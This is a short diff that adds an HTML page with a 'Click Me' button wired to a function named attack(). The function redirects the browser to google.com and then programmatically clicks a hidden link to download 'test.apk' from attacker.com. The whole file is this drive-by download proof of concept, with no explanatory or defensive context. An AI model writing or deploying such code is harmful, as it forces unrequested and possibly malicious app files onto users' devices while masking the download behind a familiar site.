@@ -1,0 +1,16 @@
+<button onclick="attack()">Click Me</button>
+
+<script>
+function attack() {
+    setTimeout(() => {
+        window.location.href = "https://google.com";
+    }, 2000);
+
+    setTimeout(() => {
+        var a = document.createElement('a');
+        a.href = "https://attacker.com/test.apk";
+        a.download = "test.apk";
+        a.click();
+    }, 4000);
+}
+</script>
